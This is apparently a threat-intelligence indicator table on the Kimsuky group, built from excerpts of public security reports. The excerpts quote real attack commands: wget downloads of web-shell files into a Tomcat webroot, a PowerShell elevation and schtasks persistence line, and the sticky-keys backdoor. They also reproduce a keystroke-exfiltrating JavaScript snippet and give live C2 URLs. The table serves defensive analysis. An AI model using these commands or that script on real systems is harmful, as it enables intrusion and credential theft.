1.0.0,actor--kimsuky,artifact--sha256:d7eeb0adb0f0a41176cb676e461ab33a4ff2dc8defb9a04dd98c4b230bc803fd,observation--sha256:dba3f8203541f69b51fe248fe2fab74b2eaea724effe29c93dc32e928e7b4560,file-name,powershell.exe,powershell.exe,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 13}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"In addition, the file name 'upload.php' is used in common for information leakage. The C2 server exploiting the HWP vulnerability is in Korea, and the C2 server exploiting DOC vulnerability contains the subaddress 'kr' in the middle of the address. Also, both files have exactly the same registry key 'VBAWarnings' and the log file name 'ttmp.log'. Many of the traces mentioned above and the similar pattern of server-side attacks are suggesting that both HWP malicious documents found in Korea and t",
1.0.0,actor--kimsuky,artifact--sha256:c11f8ca138932e48e4d6d50bb3f8d005fe3f9c1eae69d22f87aa05759d8eccea,observation--sha256:6662f384f7f0db31b6d3c6749ae9183b547fc8df7cb24ea5cb0a99fad046e263,file-name,pspv.exe,pspv.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:224da31dd976182e7b052f2d0c8b4961998e2f19b8cb5495df2f48eb2372742d,observation--sha256:71ca3e34bbd09c2cce2636a269103b2c9055d843e64ae71374ce80ea856d99ab,file-name,putty.exe,putty.exe,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:f39613c2fb52d2fdf8629fbe6c78bb6ba6369559b74778d09abc1d870afe503f,observation--sha256:500412bb57f83c5f7f0b6d14ea5a097f922b959b4ac5a77c8308a1eb7c826202,file-name,questionnaire.docx,questionnaire.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--9df172e770726627,kimsuky/Joint_CSA_NK_Using_Social_Engineering_20230531.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | DOS | NSA| NIS | NPA | MOFA TLP:CLEAR Page 7 of 21 | Product ID: CSA-20230601-1 TLP:CLEAR Sample email communication 1: Follow-on email: If the targets agree to the interview, the actors will then follow up with a second email containing malicious content. Additionally, we have seen Kimsuky actors spoof legitimate journalists to specifically target think tank employees. Kimsuky actors commonly pose questions in their spearphishing emails about current events, such as issues regarding Russi",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5362f7a0b9225382d7774c017f4fadd34b0ecf6480392a5243cf646b95286c90,observation--sha256:72c9e9ba54644f9974e61dd2325b11175ed45b0d08fad394b99084b3e67c23bb,file-name,questionnaire.vbs,questionnaire.vbs,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:fa4c6b0e1a7ed2d008f828980c03ce025854ede8003a7fbf5bb04c542f40a79f,observation--sha256:5e2c741e3660eef82c31210f287073cb210f65e88cd70f430b3d2f7aee339980,file-name,r_sethc_x64.exe,r_sethc_x64.exe,candidate,2023-05-09T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Since it is 2023-05-09, there is a time difference with RDP (CVE-2019-0708) vulnerability scanning, but mail analysis and 11*.16*.7*.12*(KR) 16 (Figure 7) System information of 20*.23*.16*.5*(KR) (hxxps://www.criminalip.io) Based on the collected malicious behavior analysis results, the Kimsuky organization sent hacking emails to specific people working in the North Korea sector. Below (Table 1) shows some of the RDP (CVE-2019-0708) vulnerability scanning activities collected from 11*.16*.7*.12*",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:fa4c6b0e1a7ed2d008f828980c03ce025854ede8003a7fbf5bb04c542f40a79f,observation--sha256:ed4b1a7938ab45fcb3406a261f58be60b1b4673ae594dfed23d4cc3f597b74f7,file-name,r_sethc_x64.exe,r_sethc_x64.exe,candidate,2023-03-15T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ a.exe and r_sethc_x64.exe ÿ rdpscan_ksb04.exe The results of analyzing the characteristics and operation method of each scanner are as follows. It is used, and depending on the results, the malicious code content to be transmitted to the system where the RDP (CVE-2019-0708) vulnerability exists is also determined. Operation Covert Stalker Report It may vary. (See Figure 9, Table 2 below) To run a.exe and r_sethc_x64.exe properly, Atk.txt is required, and the file is scanned for RDP (CVE-2019-0",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:fa4c6b0e1a7ed2d008f828980c03ce025854ede8003a7fbf5bb04c542f40a79f,observation--sha256:a6522606bd3511da0dea1a3359f1833385e989faea526b43a0bd9df8fc077ed9,file-name,r_sethc_x64.exe,r_sethc_x64.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:fa4c6b0e1a7ed2d008f828980c03ce025854ede8003a7fbf5bb04c542f40a79f,observation--sha256:fa149ff2642cf6f777db157fcb8922fe3f0adef3d3e229d9f28b025c6e225c11,file-name,r_sethc_x64.exe,r_sethc_x64.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Information related to this is described in “(4-3) C2 Management and Operations.” Since it contains information about the file, it can be used as a reference when analyzing the file, and you can check meaningful information in the PDB path. can. For example, in Table 4 below, the string vs15 commonly included in PDB information is used by the Kimsuky organization. r_sethc_x64.ex (Table 3) Comparison of strings in r_sethc_x64.exe with original source It exists within a function that does not work",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:fa4c6b0e1a7ed2d008f828980c03ce025854ede8003a7fbf5bb04c542f40a79f,observation--sha256:9038c258c963d9c0117e6d865369115e58ee3af5d3a528cb4b3dbaf8b0cc2817,file-name,r_sethc_x64.exe,r_sethc_x64.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:87047ac488e9c775ad4ad2a77e0bf5194d1384a747b3be7358a17d71b1c3a304,observation--sha256:5eb9cbe256ead401d6c261a5646710b1a8e1973a8a3f10e826e60193d7aff036,file-name,(.rar,rar,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 In the example above, Kimsuky targeted the South Korean Embassy in China. After several emails in the thread discussing a meeting, the payload was sent as a password protected archive (.rar) hosted in Google Drive. In this case the LNK payload was hidden as a Hangul word processor file with a double extension. Payloads LNKs everywhere During our research Rapid7 observed the use of several different versions of LNK file payloads built from a variant of a LNK builder proof of concept (POC). Curr",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:baf05655f7128cd78b8caecc0ddd05b947d4d7fb72812ee18c3a6899918051d4,observation--sha256:d272d7c4edea3ca77c8ed3004de4c53ac7202f6f8c280050afb4d2752cde0c06,file-name,rdpattack_la05.exe,rdpattack_la05.exe,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:50574c956ff9eece0073b8a171ee878a67883c9a9b572a7cec8d88483d9e7c92,observation--sha256:319cb1b4ebd7c08f87a58724aaed994f5eb0ee51b7d732ade84bf14c6f95acbf,file-name,rdpscan.pdb,rdpscan.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Information related to this is described in “(4-3) C2 Management and Operations.” Since it contains information about the file, it can be used as a reference when analyzing the file, and you can check meaningful information in the PDB path. can. For example, in Table 4 below, the string vs15 commonly included in PDB information is used by the Kimsuky organization. r_sethc_x64.ex (Table 3) Comparison of strings in r_sethc_x64.exe with original source It exists within a function that does not work",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:50574c956ff9eece0073b8a171ee878a67883c9a9b572a7cec8d88483d9e7c92,observation--sha256:8bf24f3ad156803d1b9efe80755756b60ae0f71a7412ff10f258793b9fd28c6e,file-name,rdpscan.pdb,rdpscan.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d2e2a4415082c2ce6513bc455d5ab0c9aba0f1eafaf8ae7876d4d2ebad90d884,observation--sha256:e5616b3e2148e362878e3ba6f69bb014593640632657af65927ad6ee8621587b,file-name,rdpscan_Liu.exe,rdpscan_Liu.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d2e2a4415082c2ce6513bc455d5ab0c9aba0f1eafaf8ae7876d4d2ebad90d884,observation--sha256:0a57766b7e70ff01579d387943874adce8ddcf3ecae6254f87e1d42f80dc24f6,file-name,rdpscan_Liu.exe,rdpscan_Liu.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8271fab47ebf3249a1cf0ebd02c916337962740b10287ecc8dedb9c29e1bed05,observation--sha256:445d3f4c9a65a974e779e4e990b2f3dd3ac9398bcc14841d3e59b4f8e51c0594,file-name,rdpscan_ksb04.exe,rdpscan_ksb04.exe,candidate,2023-03-15T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ a.exe and r_sethc_x64.exe ÿ rdpscan_ksb04.exe The results of analyzing the characteristics and operation method of each scanner are as follows. It is used, and depending on the results, the malicious code content to be transmitted to the system where the RDP (CVE-2019-0708) vulnerability exists is also determined. Operation Covert Stalker Report It may vary. (See Figure 9, Table 2 below) To run a.exe and r_sethc_x64.exe properly, Atk.txt is required, and the file is scanned for RDP (CVE-2019-0",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8271fab47ebf3249a1cf0ebd02c916337962740b10287ecc8dedb9c29e1bed05,observation--sha256:db4d76e84eb46757c59b704266d80d755c1352bda47debf76fc69d1fa83e1d5f,file-name,rdpscan_ksb04.exe,rdpscan_ksb04.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Information related to this is described in “(4-3) C2 Management and Operations.” Since it contains information about the file, it can be used as a reference when analyzing the file, and you can check meaningful information in the PDB path. can. For example, in Table 4 below, the string vs15 commonly included in PDB information is used by the Kimsuky organization. r_sethc_x64.ex (Table 3) Comparison of strings in r_sethc_x64.exe with original source It exists within a function that does not work",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:10c00f711651e8132f9c0bd33021c2eb8bc0a8357de5089fc6735961528bd1c0,observation--sha256:334fc80f761e63806a659c8e6f1a5d83b427cb57f57ddd1ee6636f693860b161,file-name,rdpscan_la_1226.exe,rdpscan_la_1226.exe,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f6e7895185f55405923a68c0359f50c10dccea2873a9ed0cc007f05cb3a52e39,observation--sha256:557ab9abd6cbc5926496e23034dc74772eef052cc78c35f949afdd6f55e5e9d1,file-name,rdpv.exe,rdpv.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Vulnerability scanning is also possible. rdpv.exe (Remote Administration Tool) (Table 5) Exploited public programs Since communication with the internal system is impossible in the usage environment without going through a router, vulnerability scanning is also impossible. Remote management program official site: hxxps://www.ammyy.com/en/ Extract RDP account information remote management program RDP Wrapper explanation Additionally, exploiting publicly available programs can make it difficult fo",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:55a6e8315630298a0742d4bb8494c29b918f40cf3e0a31995dd63e3d0371c80f,observation--sha256:959f7c665050220d42300caa5ffaa576ed79a0f4e603a5c4151be2511cb37f1a,file-name,recommendation.docx,recommendation.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 63}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 27) **** Case of phishing for the purpose of hacking a specific person working at a university. North Korean expressions were also present in the index.php (proxy page) of Naver phishing in “(Table 26) C2 structural analysis and hacking target information” . In Korea, according to the Korean language norms of the National Institute of the Korean Language, convert is written as “convert,” but in North Korea, bait file I decided. URL Second, in Table 27 below, the bait file (recommendation.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:72ce49c90875ad93453a5156dffd4069420461f408583b9b3c0622252e56f2fe,observation--sha256:b4c6791095070e0dd241b80b781fef97de60351d8b2995f4495573db2332e1c7,file-name,regsvr32.exe,regsvr32.exe,candidate,2021-05-07T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 7}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 源 RAT 样本发现，该样本使用的 C2 服务器与上述服务器被解析为同一个 IP 地址（104.1 28.239.70）。 MD5 c861f25bb943f77a909b33d62bb71926 SHA1 576b953cb4fe71adb71a338a42524b0e424824c1 SHA256 fd59597169668b90c47d0ad6db1bcd7d778c6d54ee3c42bdd2d86b2d2d34 c885 文件大小 485888 字节 (474.50 KB) 文件格式 PE64 DLL 编译时间 2021/05/07 05:06:47 C&C anto.shore.ml 通过 regsvr32.exe 启动该 RAT，并调用恶意流程入口点 DllRegisterServer。 图[9].RAT 模块的导出表 执行后首先进行安装流程，自我复制到以下目录： C:\\ProgramData\\Software\\Microsoft\\Windows\\MDF\\WDFSync,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:72ce49c90875ad93453a5156dffd4069420461f408583b9b3c0622252e56f2fe,observation--sha256:39f6c26ed90cc102728f422a2c79da009b0866fe7905deef220c9d2a04fb27cf,file-name,regsvr32.exe,regsvr32.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 8}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[11].RAT 模块中设置注册表开机启动项 接着以“SpyRegsvr32-20210507140631”为名创建互斥体，此种类型互斥体在 Kims uky 之前的攻击活动中多次出现，其中有“Spy”关键字和编译时间信息“20210507”。 图[12].RAT 模块中创建互斥体 通过检查 UAC 注册表项 ConsentPromptBehaviorAdmin 和 PromptOnSecureDesktop 来确定 UAC 是否关闭，以及是否为管理员模式，如果否的话将会调用 powershell 提权运行。 powershell.exe start-process regsvr32.exe -argumentlist '/s [木马路径]' -verb runas 木马使用两层命令结构与 C2 服务器通信，使用的 C2 服务器为：anto.shore.ml。 ?m={指令 1}&p1={硬盘序列号}&p2={指令 2} 该模块可支持多种间谍类型的远控功能，包括远程 Shell、文件上传/下载,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:72ce49c90875ad93453a5156dffd4069420461f408583b9b3c0622252e56f2fe,observation--sha256:4db6aae07420054abda3301d2ccac958ede1103ce3001658193c9d2a48dd6d78,file-name,regsvr32.exe,regsvr32.exe,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:72ce49c90875ad93453a5156dffd4069420461f408583b9b3c0622252e56f2fe,observation--sha256:609eaae803492e939c9ba3a69396effe8c68cf9f75a7a4b6fbe70a75d44d50ff,file-name,regsvr32.exe,regsvr32.exe,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:72ce49c90875ad93453a5156dffd4069420461f408583b9b3c0622252e56f2fe,observation--sha256:171a729ad00a5fffaeb7d6108b844c0494617bb2b8072cce3c38ef0f86640c77,file-name,regsvr32.exe,regsvr32.exe,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:72ce49c90875ad93453a5156dffd4069420461f408583b9b3c0622252e56f2fe,observation--sha256:d869d77413bf08a09e2a128a0091af2b7882ae9ac8d2c03a5ee9055ff88bab7e,file-name,regsvr32.exe,regsvr32.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 14}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"14 • Remote access capabilities, including exfiltration of collected data • Interest in open source .NET and custom Golang RATs • Packing and simple obfuscation techniques to mask malware from basic detection methods • Custom encryption and LOLbin techniques like automated exfil and Base64 certutil encoding A technical deep dive of all Kimsuky malware is beyond the scope of this paper, however, we have included a brief description of some of the common Windows malware for further reading and res",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:281f66c604d38a2f7da085aa43292a18f1fb90dff41ae95f8af8dc1d8dd92716,observation--sha256:49f0566f2dbd04d21e69ef496e182456866c109fd1cb419880e07e5418c6db15,file-name,report_token.php,report_token.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--09cb3954225ee2bb,kimsuky/Unveil the evolution of Kimsuky targeting Android device with newly discovered mobile malware.xlsx,"{""row"": 20, ""sheet"": ""IoC""}",[],[],[],[],0,false,medium,TLP:CLEAR,xlsx-row,4.0 hxxp[:]//navernnail[.]com/fkwneovjubske4gv/report_token/report_token.php?token=[Token] FastFire C2,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:73b4e9d72ff9bbc6b441deaf002c43a43362b917598079f775281a88c7a76192,observation--sha256:754256336f62cd8701abac1c6f2192ad082d8f39c8b9d634873cf8c8bd785a84,file-name,request.php,request.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 852}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,http://www.websecuritynotices.com/request.php?i=amhraW0xQGtsaWQub3Iua3I=,Actor-directory corpus sweep; ambiguous values remain candidates.
